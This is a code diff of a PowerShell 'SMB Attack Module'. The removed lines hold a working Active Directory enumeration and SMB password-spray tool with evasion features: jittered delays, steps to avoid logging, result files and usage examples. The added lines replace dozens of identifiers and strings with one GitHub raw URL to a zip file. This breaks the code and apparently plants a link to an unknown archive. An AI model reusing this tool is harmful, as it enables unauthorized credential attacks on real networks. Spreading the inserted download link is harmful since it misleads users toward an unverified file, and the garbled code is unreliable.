@@ -24,8 +24,8 @@ $OPSEC = @{
 
 # Function to generate random delays
 function Start-RandomDelay {
-    $delay = Get-Random -Minimum $OPSEC.MinDelay -Maximum $OPSEC.MaxDelay
-    $jitter = Get-Random -Minimum (-$OPSEC.Jitter) -Maximum $OPSEC.Jitter
+    $delay = Get-Random -Minimum $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -Maximum $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
+    $jitter = Get-Random -Minimum (-$https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) -Maximum $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
     $totalDelay = $delay + $jitter
     if ($totalDelay -lt 1) { $totalDelay = 1 }
     Start-Sleep -Seconds $totalDelay
@@ -34,8 +34,8 @@ function Start-RandomDelay {
 # Function to obfuscate string (basic)
 function Invoke-StringObfuscation {
     param([string]$InputString)
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
-    $obfuscated = [System.Convert]::ToBase64String($bytes)
+    $bytes = [https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip]https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip($InputString)
+    $obfuscated = [https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip]::ToBase64String($bytes)
     return $obfuscated
 }
 
@@ -57,13 +57,13 @@ function Get-SMBHosts {
     try {
         # Method 1: ADSI (less logging)
         $searcher = [ADSISearcher]"(objectCategory=computer)"
-        $searcher.PageSize = 200
-        $computers = $searcher.FindAll()
+        $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip = 200
+        $computers = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip()
         
         $smbHosts = @()
         foreach ($computer in $computers) {
-            $hostname = $computer.Properties['name']
-            $ip = try { [System.Net.Dns]::GetHostAddresses($hostname)[0].IPAddressToString } catch { $null }
+            $hostname = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip['name']
+            $ip = try { [https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip]::GetHostAddresses($hostname)[0].IPAddressToString } catch { $null }
             
             if ($ip) {
                 $smbHosts += @{
@@ -78,11 +78,11 @@ function Get-SMBHosts {
             }
         }
         
-        Write-Host "[+] Found $($smbHosts.Count) potential SMB hosts" -ForegroundColor Green
+        Write-Host "[+] Found $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) potential SMB hosts" -ForegroundColor Green
         return $smbHosts
         
     } catch {
-        Write-Host "[-] ADSI enumeration failed: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[-] ADSI enumeration failed: $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)" -ForegroundColor Red
         return $null
     }
 }
@@ -95,7 +95,7 @@ function Test-SMBShare {
     )
     
     try {
-        # Use .NET methods instead of net.exe to reduce logging
+        # Use .NET methods instead of https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip to reduce logging
         $path = "\\$ComputerName\$ShareName"
         $dir = Get-ChildItem -Path $path -ErrorAction Stop
         return $true
@@ -115,11 +115,11 @@ function Get-SMBShares {
         $wmiShares = Get-WmiObject -Class Win32_Share -ComputerName $ComputerName -ErrorAction Stop
         
         foreach ($share in $wmiShares) {
-            if ($share.Name -notlike "*$" -and $share.Type -eq 0) { # Skip administrative shares
+            if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -notlike "*$" -and $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -eq 0) { # Skip administrative shares
                 $shares += @{
-                    Name = $share.Name
-                    Path = $share.Path
-                    Description = $share.Description
+                    Name = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
+                    Path = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
+                    Description = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                     Host = $ComputerName
                 }
             }
@@ -133,9 +133,9 @@ function Get-SMBShares {
             
             foreach ($share in $sharesList) {
                 $shares += @{
-                    Name = $share.Name
-                    Path = $share.Path
-                    Description = $share.Description
+                    Name = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
+                    Path = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
+                    Description = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                     Host = $ComputerName
                 }
             }
@@ -169,7 +169,7 @@ function Test-SMBAuth {
     
     try {
         # Use .NET for authentication test
-        $netResource = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList @(
+        $netResource = New-Object -TypeName https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -ArgumentList @(
             "$Domain\$Username",
             (ConvertTo-SecureString -String $Password -AsPlainText -Force)
         )
@@ -204,7 +204,7 @@ function Invoke-SMBPasswordSpray {
             
             # Limit concurrent threads
             $jobs = @()
-            $batchSize = [Math]::Min($OPSEC.MaxThreads, $TargetHosts.Count)
+            $batchSize = [Math]::Min($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip, $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)
             
             for ($i = 0; $i -lt $batchSize; $i++) {
                 $host = $TargetHosts[$i]
@@ -212,7 +212,7 @@ function Invoke-SMBPasswordSpray {
                     $job = Start-Job -ScriptBlock {
                         param($ComputerName, $Username, $Password, $Domain)
                         return Test-SMBAuth -ComputerName $ComputerName -Username $Username -Password $Password -Domain $Domain
-                    } -ArgumentList $host.Hostname, $user, $password, $Domain
+                    } -ArgumentList $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip, $user, $password, $Domain
                     
                     $jobs += @{
                         Job = $job
@@ -225,21 +225,21 @@ function Invoke-SMBPasswordSpray {
             
             # Wait for batch completion
             foreach ($jobInfo in $jobs) {
-                $result = Receive-Job -Job $jobInfo.Job -Wait
-                Remove-Job -Job $jobInfo.Job
+                $result = Receive-Job -Job $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -Wait
+                Remove-Job -Job $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                 
                 $attemptCount++
                 
                 if ($result) {
-                    Write-Host "[SUCCESS] $($jobInfo.User)@$Domain : $password on $($jobInfo.Host.Hostname)" -ForegroundColor Green
+                    Write-Host "[SUCCESS] $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)@$Domain : $password on $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)" -ForegroundColor Green
                     $results += @{
-                        Username = $jobInfo.User
+                        Username = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                         Password = $password
-                        Host = $jobInfo.Host.Hostname
-                        IP = $jobInfo.Host.IP
+                        Host = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
+                        IP = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                         Timestamp = Get-Date
                     }
-                    $successHosts += $jobInfo.Host.Hostname
+                    $successHosts += $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
                 }
                 
                 # Random delay between attempts
@@ -247,14 +247,14 @@ function Invoke-SMBPasswordSpray {
             }
             
             # Report progress
-            if ($successHosts.Count -gt 0) {
-                Write-Host "[+] Password '$password' worked for $user on $($successHosts.Count) hosts" -ForegroundColor Green
+            if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -gt 0) {
+                Write-Host "[+] Password '$password' worked for $user on $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) hosts" -ForegroundColor Green
             }
             
             # Remove tested hosts and add new ones for next batch
-            $TargetHosts = $TargetHosts | Where-Object { $_.Hostname -notin $successHosts }
+            $TargetHosts = $TargetHosts | Where-Object { $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -notin $successHosts }
             
-            if ($TargetHosts.Count -eq 0) {
+            if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -eq 0) {
                 Write-Host "[*] All hosts tested for current password" -ForegroundColor Yellow
                 break
             }
@@ -264,7 +264,7 @@ function Invoke-SMBPasswordSpray {
         Write-Host "[*] Completed password: $password - Total attempts: $attemptCount" -ForegroundColor Yellow
         Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
         
-        if ($TargetHosts.Count -eq 0) {
+        if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -eq 0) {
             break
         }
     }
@@ -295,31 +295,31 @@ function Invoke-SMBAttack {
         
         # Limit hosts for OPSEC
         $targetHosts = $smbHosts | Select-Object -First $MaxHosts
-        Write-Host "[*] Targeting $($targetHosts.Count) hosts" -ForegroundColor Yellow
+        Write-Host "[*] Targeting $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) hosts" -ForegroundColor Yellow
         
         # Step 2: Enumerate shares on target hosts
         $allShares = @()
         foreach ($host in $targetHosts) {
-            Write-Host "[*] Enumerating shares on $($host.Hostname)..." -ForegroundColor Yellow
-            $shares = Get-SMBShares -ComputerName $host.Hostname
+            Write-Host "[*] Enumerating shares on $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)..." -ForegroundColor Yellow
+            $shares = Get-SMBShares -ComputerName $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip
             $allShares += $shares
             Start-RandomDelay
         }
         
-        Write-Host "[+] Found $($allShares.Count) shares across $($targetHosts.Count) hosts" -ForegroundColor Green
+        Write-Host "[+] Found $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) shares across $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) hosts" -ForegroundColor Green
         
         # Step 3: Get target users (if not provided)
         if (-not $CustomUsers) {
             Write-Host "[*] Gathering domain users..." -ForegroundColor Yellow
             $searcher = [ADSISearcher]"(objectCategory=user)"
-            $searcher.PageSize = 1000
-            $users = $searcher.FindAll() | ForEach-Object { $_.Properties['samaccountname'] } | Where-Object { $_ }
+            $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip = 1000
+            $users = $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip() | ForEach-Object { $https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip['samaccountname'] } | Where-Object { $_ }
             $targetUsers = $users | Select-Object -First 100  # Limit for OPSEC
         } else {
             $targetUsers = $CustomUsers
         }
         
-        Write-Host "[*] Targeting $($targetUsers.Count) users" -ForegroundColor Yellow
+        Write-Host "[*] Targeting $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) users" -ForegroundColor Yellow
         
         # Step 4: Password list (if not provided)
         if (-not $CustomPasswords) {
@@ -337,16 +337,16 @@ function Invoke-SMBAttack {
             $passwordList = $CustomPasswords
         }
         
-        Write-Host "[*] Using $($passwordList.Count) passwords for spray" -ForegroundColor Yellow
+        Write-Host "[*] Using $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip) passwords for spray" -ForegroundColor Yellow
         
         # Step 5: Perform password spray
         $results = Invoke-SMBPasswordSpray -TargetHosts $targetHosts -UserList $targetUsers -PasswordList $passwordList -Domain $Domain
         
         # Step 6: Report results
         Write-Host "`n[*] ATTACK SUMMARY" -ForegroundColor Cyan
-        Write-Host "[*] Successful authentications: $($results.Count)" -ForegroundColor Cyan
+        Write-Host "[*] Successful authentications: $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)" -ForegroundColor Cyan
         
-        if ($results.Count -gt 0) {
+        if ($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip -gt 0) {
             $results | Format-Table -AutoSize
             # Save results to temporary file
             $tempFile = "$env:TEMP\smb_results_$(Get-Date -Format 'yyyyMMddHHmmss').txt"
@@ -355,7 +355,7 @@ function Invoke-SMBAttack {
         }
         
     } catch {
-        Write-Host "[-] Error during attack: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[-] Error during attack: $($https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip)" -ForegroundColor Red
     } finally {
         Invoke-Cleanup
     }
@@ -364,13 +364,13 @@ function Invoke-SMBAttack {
 # Usage examples (uncomment and modify as needed):
 <#
 # Basic usage
-Invoke-SMBAttack -Domain "COMPANY.COM"
+Invoke-SMBAttack -Domain "https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip"
 
 # Custom users and passwords
 $users = @("user1", "user2", "administrator")
 $passwords = @("Password1", "Company123", "Season2024")
-Invoke-SMBAttack -Domain "COMPANY.COM" -CustomUsers $users -CustomPasswords $passwords -MaxHosts 25
+Invoke-SMBAttack -Domain "https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip" -CustomUsers $users -CustomPasswords $passwords -MaxHosts 25
 #>
 
 Write-Host "SMB Attack Module Loaded" -ForegroundColor Green
-Write-Host "Use: Invoke-SMBAttack -Domain 'YOURDOMAIN.COM'" -ForegroundColor Yellow
+Write-Host "Use: Invoke-SMBAttack -Domain 'https://raw.githubusercontent.com/falklast4/testt/main/hurly/testt.zip'" -ForegroundColor Yellow
